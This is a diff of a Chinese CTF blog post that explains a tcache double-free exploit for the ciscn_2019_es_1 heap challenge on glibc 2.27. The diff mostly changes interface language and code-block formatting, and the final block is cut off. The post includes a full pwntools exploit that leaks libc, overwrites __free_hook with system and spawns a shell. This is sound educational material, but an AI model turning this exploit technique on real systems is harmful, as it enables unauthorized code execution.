@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CH">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -18,13 +18,13 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="ciscn_2019_es_1题目链接  要点：  虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测 我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64  ida速览 经典的堆菜单，但是glibc2.27具有tcache  int">
+        <meta name="description" content="ciscn_2019_es_1题目链接  要点：  虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测 我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64  ida速览 经典的堆菜单，但是glibc2.27具有tcache  1234">
 <meta property="og:type" content="article">
 <meta property="og:title" content="初遇tcache-double_free">
 <meta property="og:url" content="http://downbeat.top/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/index.html">
-<meta property="og:site_name" content="Dream Of All Stack">
-<meta property="og:description" content="ciscn_2019_es_1题目链接  要点：  虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测 我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64  ida速览 经典的堆菜单，但是glibc2.27具有tcache  int">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="D0wnBe@t">
+<meta property="og:description" content="ciscn_2019_es_1题目链接  要点：  虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测 我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64  ida速览 经典的堆菜单，但是glibc2.27具有tcache  1234">
+<meta property="og:locale" content="zh_CH">
 <meta property="og:image" content="http://downbeat.top/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202526933.bmp">
 <meta property="og:image" content="http://downbeat.top/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202709261.bmp">
 <meta property="og:image" content="http://downbeat.top/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202720899.bmp">
@@ -86,9 +86,9 @@
     
 
     <script id="hexo-configurations">
-    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CH","path":"search.xml"};
     window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
     
@@ -159,7 +159,7 @@
                                    href="/"
                                         >
                                     <i class="fa-regular fa-house fa-fw"></i>
-                                    首页
+                                    HOME
                                     
                                 </a>
 
@@ -193,7 +193,7 @@
                            href="/"
                         >
                             <span>
-                                首页
+                                HOME
                             </span>
                             
                                 <i class="fa-regular fa-house fa-sm fa-fw"></i>
@@ -212,15 +212,15 @@
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
-        <div class="label text-third-text-color text-sm">标签</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">分类</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
-        <div class="label text-third-text-color text-sm">文章</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
     </div>
@@ -268,14 +268,14 @@
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-09-22 20:06:12</span>
         <span class="mobile">2024-09-22 20:06:12</span>
-        <span class="hover-info">创建</span>
+        <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
             <span class="desktop">2024-09-22 21:26:39</span>
             <span class="mobile">2024-09-22 21:26:39</span>
-            <span class="hover-info">更新</span>
+            <span class="hover-info">Updated</span>
         </span>
     
 
@@ -296,12 +296,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>916 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>916 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
         </span>
     
     
@@ -329,9 +329,9 @@
 <h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><ul>
 <li><strong>经典的堆菜单，但是glibc2.27具有tcache</strong></li>
 </ul>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hate 2.29 , can you understand me?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;maybe you know the new libc&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(); <span class="comment">// 菜单</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        call(); <span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jack Ma doesn&#x27;t like you~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hate 2.29 , can you understand me?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;maybe you know the new libc&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(); <span class="comment">// 菜单</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        call(); <span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jack Ma doesn&#x27;t like you~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类似形成一个结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line">    Chunk* chunk;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类似形成一个结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line">    Chunk* chunk;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 
 
@@ -346,7 +346,7 @@
 <li>先malloc(0x410) 绕过tcache进入unsorted bin，然后直接show就可以泄露libc，也可以malloc(0x80)，然后free8次，再show也是可以的，是因为此题目没有double free检查</li>
 <li>然后double free改free_hook为system，就差不多了，跟之前一样的步骤</li>
 </ul>
-<h1 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h1><h2 id="绕过tcache-泄露libc"><a href="#绕过tcache-泄露libc" class="headerlink" title="绕过tcache+泄露libc"></a>绕过tcache+泄露libc</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<h1 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h1><h2 id="绕过tcache-泄露libc"><a href="#绕过tcache-泄露libc" class="headerlink" title="绕过tcache+泄露libc"></a>绕过tcache+泄露libc</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li>先malloc(0x410)（＞0x408）绕过tcache，后面两个malloc是为了修改free_hook和最后的getshell</li>
@@ -356,7 +356,7 @@
 <ul>
 <li>由于此时的指针没有清零，可以直接show，泄露libc</li>
 </ul>
-<h2 id="double-free-getshell"><a href="#double-free-getshell" class="headerlink" title="double free+getshell"></a>double free+getshell</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># glibc2.30才有的double free的检查</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"># 此时 tcache bin 中 1 -&gt; 1</span><br><span class="line">add(0x20,p64(free_hook),b&#x27;1&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbb&#x27;,b&#x27;1&#x27;)</span><br><span class="line">add(0x20,p64(system),b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h2 id="double-free-getshell"><a href="#double-free-getshell" class="headerlink" title="double free+getshell"></a>double free+getshell</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># glibc2.30才有的double free的检查</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"># 此时 tcache bin 中 1 -&gt; 1</span><br><span class="line">add(0x20,p64(free_hook),b&#x27;1&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbb&#x27;,b&#x27;1&#x27;)</span><br><span class="line">add(0x20,p64(system),b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li>double free之后：</li>
@@ -379,7 +379,7 @@
 <ul>
 <li>最后直接free(2)即可，相当于system(“&#x2F;bin&#x2F;sh”)</li>
 </ul>
-<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26786)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Chunk&#123;</span></span><br><span class="line"><span class="string">    Chunk* chunk;</span></span><br><span class="line"><span class="string">    int size;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,call</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input compary call:\n&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># glibc2.30才有的double free的检查</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache bin 中 1 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span 